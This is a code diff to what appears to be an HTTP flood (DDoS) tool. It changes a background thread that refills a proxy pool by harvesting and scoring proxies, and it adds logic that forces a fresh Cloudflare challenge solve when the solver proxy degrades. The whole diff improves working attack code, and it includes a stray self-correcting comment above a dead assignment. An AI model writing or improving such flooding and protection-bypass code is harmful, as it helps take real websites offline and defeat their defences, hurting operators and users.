@@ -1319,18 +1319,32 @@ class ReloadSentinel(Thread):
         if self.interval <= 0:
             return
 
+        last_refresh = time() - self.interval # Force immediate check if needed, but wait it already initialized pool.
+        # Actually, let's start last_refresh at now.
+        last_refresh = time()
+        jitter = random.uniform(0, 30)
+
         while True:
-            # Add jitter to prevent simultaneous database writes across multiple tasks
-            sleep(self.interval + random.uniform(0, 30))
+            sleep(5)
+            now = time()
+            
+            pool_depleted = self.pool.get_tactical_size() < 10
+            time_to_refresh = (now - last_refresh) >= (self.interval + jitter)
+
+            if not pool_depleted and not time_to_refresh:
+                continue
+
+            last_refresh = now
+            jitter = random.uniform(0, 30)
             
             # Check if pool is critically low
-            if self.pool.get_tactical_size() < 10:
+            if pool_depleted:
                 logger.warning(f"{bcolors.FAIL}[!] Sentinel Alert: Tactical Pool Depleted ({self.pool.get_tactical_size()} active). Executing Emergency Sourcing.{bcolors.RESET}")
                 raw_emergency = AutonomousHarvester.emergency_harvest(self.proxy_ty)
                 if raw_emergency:
                     scored_emergency = asyncio.run(TacticalProxyValidator.validate_and_score(raw_emergency, str(self.url) if self.url else None))
-                    self.pool.update_pool(scored_emergency)
-                    continue
+                    self.pool.update_pool(scored_emergency, list(raw_emergency))
+                continue
 
             logger.info(
                 f"{bcolors.OKCYAN}[*] Sentinel: Periodic proxy refresh initiated...{bcolors.RESET}"
@@ -1343,10 +1357,10 @@ class ReloadSentinel(Thread):
                     # In handleProxyList we return normal Proxies if from file/url directly.
                     # We need to ensure they are scored here if they aren't already.
                     if isinstance(new_proxies, list) and len(new_proxies) > 0 and isinstance(new_proxies[0], TacticalProxy):
-                        self.pool.update_pool(new_proxies)
+                        self.pool.update_pool(new_proxies, [p.base for p in new_proxies])
                     else:
                         scored = asyncio.run(TacticalProxyValidator.validate_and_score(set(new_proxies), str(self.url) if self.url else None))
-                        self.pool.update_pool(scored)
+                        self.pool.update_pool(scored, list(new_proxies))
             except Exception as e:
                 logger.error(
                     f"{bcolors.FAIL}[!] Sentinel Error during refresh: {e}{bcolors.RESET}"
@@ -3707,6 +3721,7 @@ class HttpFlood:
                     self._proxy_pool.report_failure(pro)
 
     _cfbuam_expiry = 0
+    _cfbuam_proxy_fails = 0
 
     async def CFBUAM(self) -> None:
         """
@@ -3831,6 +3846,12 @@ class HttpFlood:
                                     TIMEOUT_SENT += 1
                                     if pro and self._proxy_pool:
                                         self._proxy_pool.report_failure(pro)
+                                    elif not pro and HttpFlood._cfbuam_proxy:
+                                        HttpFlood._cfbuam_proxy_fails += 1
+                                        if HttpFlood._cfbuam_proxy_fails > max(50, self._rpc):
+                                            logger.debug(f"{bcolors.WARNING}[!] CFBUAM Solver Proxy degraded. Forcing re-solve...{bcolors.RESET}")
+                                            HttpFlood._cfbuam_cookie = None
+                                            HttpFlood._cfbuam_proxy_fails = 0
                                 else:
                                     await asyncio.sleep(0.5 * (2 ** attempt))
             else:
